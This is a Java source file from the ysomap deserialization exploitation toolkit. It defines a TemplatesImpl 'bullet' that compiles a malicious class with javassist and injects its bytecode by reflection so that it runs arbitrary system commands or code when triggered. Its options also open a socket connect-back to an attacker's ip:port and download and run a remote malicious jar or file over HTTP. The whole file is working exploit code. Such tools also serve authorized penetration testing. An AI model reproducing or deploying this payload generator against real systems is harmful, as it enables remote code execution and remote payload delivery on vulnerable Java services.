package ysomap.bullets.jdk;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import echo.SocketEchoPayload;
import echo.TomcatEchoPayload;
import javassist.*;
import loader.RemoteFileHttpExecutor;
import loader.RemoteFileHttpLoader;
import loader.RemoteFileLoader;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.io.IOException;
import java.io.Serializable;
import java.util.UUID;

/**
 * 编译恶意类，并填充到TemplatesImpl
 * 共有以下选择
 * 1. 命令执行
 *    set type cmd
 *
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk"})
@Authors({ Authors.WH1T3P1G })
@Targets({Targets.JDK})
@Details("载入恶意class字节码，并执行任意代码，依赖TemplatesImpl")
public class TemplatesImplBullet implements Bullet<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;

    @NotNull
    @Require(name = "type", detail = "4种方式（cmd,code,socket,loader）:\n" +
                                "1. cmd，body写入具体的系统命令；\n" +
                                "2. code, body写入具体需要插入执行的代码；\n" +
                                "3. socket, body写入`ip:port`\n" +
                                "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname` 或 `url;os`")
    private String type = "cmd";

    @NotNull
    @Require(name = "body" ,detail = "evil code body")
    private String body = "";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
                                                      "可选default、TomcatEcho、SocketEcho、RemoteFileLoader、RemoteFileHttpLoader、RemoteFileHttpExecutor")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    public String action = "outputProperties";

    @Override
    public Object getObject() throws Exception {
        String processedBody = body;
        if("cmd".equals(type)){
            if("false".equals(exception)){
                processedBody = PayloadHelper.makeRuntimeExecPayload(processedBody);
            }else{
                processedBody = PayloadHelper.makeExceptionPayload(processedBody);
            }
        }else if("code".equals(type) || "socket".equals(type) || "loader".equals(type)){
            // do nothing
        }

        initClazz();
        // create evil bytecodes
        byte[] bytecodes = makeEvilByteCode(processedBody);
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        ReflectionHelper.setFieldValue(templates, "_name", UUID.randomUUID().toString());
        ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }

    private byte[] makeEvilByteCode(String body) throws NotFoundException, CannotCompileException, IOException {
        ClassPool pool = new ClassPool(true);
        CtClass cc = null;
        String code = null;

        if("default".equals(effect)){
            cc = ClassFiles.makeClassFromExistClass(pool,
                    StubTransletPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            code = body;
        }else if("TomcatEcho".equals(effect)){
            cc = ClassFiles.makeClassFromExistClass(pool,
                    TomcatEchoPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            cc.setName("TomcatEcho"+System.currentTimeMillis());
        }else if("SocketEcho".equals(effect)){
            String[] remote = body.split(":");
            code = "host=\""+remote[0]+"\";\nport="+remote[1]+";";
            pool.appendClassPath(new ClassClassPath(SocketEchoPayload.class));
            cc = pool.getCtClass(SocketEchoPayload.class.getName());
            cc.setName("SocketEcho"+System.currentTimeMillis());
        }else if("RemoteFileLoader".equals(effect)){
            String[] remote = body.split(";");
            code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
            pool.appendClassPath(new ClassClassPath(RemoteFileLoader.class));
            cc = pool.getCtClass(RemoteFileLoader.class.getName());
            cc.setName("Loader"+System.currentTimeMillis());
        }else if("RemoteFileHttpLoader".equals(effect)){
            String[] remote = body.split(";");
            code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
            pool.appendClassPath(new ClassClassPath(RemoteFileHttpLoader.class));
            cc = pool.getCtClass(RemoteFileHttpLoader.class.getName());
            cc.setName("Loader"+System.currentTimeMillis());
        }else if("RemoteFileHttpExecutor".equals(effect)){
            String[] remote = body.split(";");
            code = "url=\""+remote[0]+"\";\nos=\""+remote[1]+"\";";
            pool.appendClassPath(new ClassClassPath(RemoteFileHttpExecutor.class));
            cc = pool.getCtClass(RemoteFileHttpExecutor.class.getName());
            cc.setName("Loader"+System.currentTimeMillis());
        }

        if(cc != null){
            if(code != null){
                ClassFiles.insertStaticBlock(cc, code);
            }
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
            return cc.toBytecode();
        }else{
            return new byte[0];
        }
    }

    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public StubTransletPayload(){
            transletVersion = 101;
        }

        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }


    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TemplatesImplBullet();
        bullet.set("type", args[0]);
        bullet.set("body", args[1]);
        bullet.set("effect", args[2]);
        bullet.set("exception", args[3]);
        return bullet;
    }
}
